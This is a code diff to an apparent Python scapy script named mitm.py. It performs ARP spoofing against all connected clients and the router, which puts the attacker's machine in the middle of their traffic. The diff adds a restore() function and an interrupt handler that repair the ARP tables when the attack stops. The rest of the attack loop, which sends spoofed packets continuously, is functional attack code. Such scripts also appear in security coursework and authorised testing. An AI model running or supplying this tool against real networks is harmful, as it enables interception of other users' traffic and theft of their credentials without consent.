@@ -161,6 +161,11 @@ def spoof(target,spoof):
     scapy.send(packet, verbose=False)
 
 
+def restore(target,source):
+    packet      = scapy.ARP(op=2,pdst=target["ip"],hwdst=target["mac"],psrc=source["ip"],hwsrc=source["mac"])
+    scapy.send(packet, count=4, verbose=False)
+
+
 # Launch script
 os.system('clear')
 
@@ -197,14 +202,24 @@ allow_package_routing(opsys)
 print("\n[+] Spoof all connected clients:")
 
 sent_packets_count = 0
-while True:
+
+try:
+    while True:
+        for client in clients_list:
+            # send spoof packets continuously to router and victim
+            router = {"mac": router_mac,"ip": router_ip}
+            spoof(client,router)
+            spoof(router,client)
+            sent_packets_count = sent_packets_count + 2
+            print("\r[+] Sent 2 spoof packets (" + str(sent_packets_count) + " total): " + client["ip"] + " & " + router_ip, end="")
+            sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
     for client in clients_list:
         # send spoof packets continuously to router and victim
-        router = {"mac": router_mac,"ip": router_ip}
-        spoof(client,router)
-        spoof(router,client)
-        sent_packets_count = sent_packets_count + 2
-        print("\r[+] Sent 2 spoof packets (" + str(sent_packets_count) + " total): " + client["ip"] + " & " + router_ip, end="")
-        sys.stdout.flush()
-    time.sleep(2)
+        router = {"mac": router_mac, "ip": router_ip}
+        restore(client, router)
+        restore(router, client)
+    print ("\n\n[-] Fixing ARP tables...")
+    print ("[-] Quitting mitm.py")
 
